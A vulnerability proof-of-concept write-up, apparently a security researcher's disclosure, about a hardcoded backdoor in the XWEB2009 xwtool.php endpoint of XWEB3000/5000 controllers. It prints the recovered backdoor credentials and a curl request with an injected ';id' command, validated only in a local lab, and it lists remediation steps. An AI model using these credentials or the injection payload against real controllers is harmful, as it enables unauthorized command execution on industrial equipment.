# PoC: XWEB2009 xwtool hardcoded backdoor and command execution

- Product: XWEB3000/5000 legacy PHP application (XWEB2009)
- Source: official 4.0.0 base RPM from `usb-update-4.0.12.zip`
- Status: **locally validated through Apache; candidate new finding**
- Live-controller testing: not performed

## Evidence

`extracted/XWEB3000_5000_v4000_cpio/var/www/html/service/xwtool.php:14-29`
compares `crypt($usr, $psw)` with the fixed value `posd/FUXXUG.A` and grants
command access on equality. A second path compares user `gbr201067080568` with
the device day password. Lines 31-40 append the posted command to `xjsyswrap`,
and line 80 executes it with `system()`.

The fixed DES hash was recovered as:

```text
Administ / po  ->  posd/FUXXUG.A
```

John the Ripper recovered `Administ` from a small candidate set. The hash was
then reproduced independently and used in an HTTP request.

## Local validation

The original endpoint ran in the isolated Apache/PHP compatibility lab with
`xjsyswrap` and `xjpasswd` replaced by harmless stubs. This request was sent:

```bash
curl --data-urlencode 'user=Administ' \
     --data-urlencode 'pass=po' \
     --data-urlencode 'cmd=;id' \
     'http://127.0.0.1:18080/service/xwtool.php'
```

The returned page contained the lab `id` output, confirming authentication-bypass
and command execution. No device was contacted and no destructive command was
used.

## Remediation

- Remove the fixed verifier and all undocumented command-execution paths.
- Require per-user salted modern password hashes and explicit authorization for
  administrative actions.
- Remove direct shell invocation from the web application.
- Rotate any shared/day-password material and review logs for `xwtool` access.

This is a locally validated candidate, not a live-controller exploitation claim.
